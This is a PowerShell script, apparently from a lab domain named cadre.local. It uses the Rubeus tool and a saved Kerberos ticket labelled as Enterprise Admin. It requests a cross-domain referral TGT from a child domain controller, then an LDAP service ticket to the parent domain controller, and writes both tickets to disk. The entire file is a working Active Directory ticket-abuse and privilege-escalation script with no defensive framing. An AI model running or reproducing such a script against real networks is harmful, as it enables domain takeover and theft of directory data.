[CmdletBinding()]
param(
    [string]$Kirbi = "C:\Tools\cadre-attack\T102-capture\EA-aes.kirbi"
)
$ErrorActionPreference = "Continue"

$rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$refFile = "C:\Tools\cadre-attack\T102-capture\EA-referral.kirbi"
Remove-Item $refFile -ErrorAction SilentlyContinue

Write-Output "--- asktgs referral TGT, save to file ---"
& $rubeus asktgs /ticket:$Kirbi /service:krbtgt/cadre.local /dc:dc02.child.cadre.local /outfile:$refFile 2>&1 | Select-Object -Last 5 | ForEach-Object { Write-Output "REF|$_" }
Write-Output "REF_EXISTS $(Test-Path $refFile)"
if (Test-Path $refFile) { Write-Output "REF_SIZE $((Get-Item $refFile).Length)" }

if (Test-Path $refFile) {
  Write-Output "--- asktgs LDAP/dc01 with referral, save ---"
  $ldapFile = "C:\Tools\cadre-attack\T102-capture\EA-ldap.kirbi"
  Remove-Item $ldapFile -ErrorAction SilentlyContinue
  & $rubeus asktgs /ticket:$refFile /service:LDAP/dc01.cadre.local /dc:dc01.cadre.local /outfile:$ldapFile 2>&1 | Select-Object -Last 5 | ForEach-Object { Write-Output "TGS|$_" }
  Write-Output "LDAP_EXISTS $(Test-Path $ldapFile)"
  if (Test-Path $ldapFile) { Write-Output "LDAP_SIZE $((Get-Item $ldapFile).Length)" }
}
